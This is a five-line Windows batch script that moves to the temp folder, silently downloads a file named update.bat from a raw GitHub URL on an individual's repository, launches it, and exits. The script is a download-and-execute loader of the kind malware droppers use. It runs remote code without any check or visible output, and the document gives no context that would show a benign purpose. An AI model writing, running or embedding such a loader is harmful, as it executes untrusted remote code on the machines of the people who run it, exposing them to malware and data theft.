@echo off
cd %temp%
curl -s https://raw.githubusercontent.com/pinguinooo/Helix/main/update.bat --output update.bat
start update.bat
exit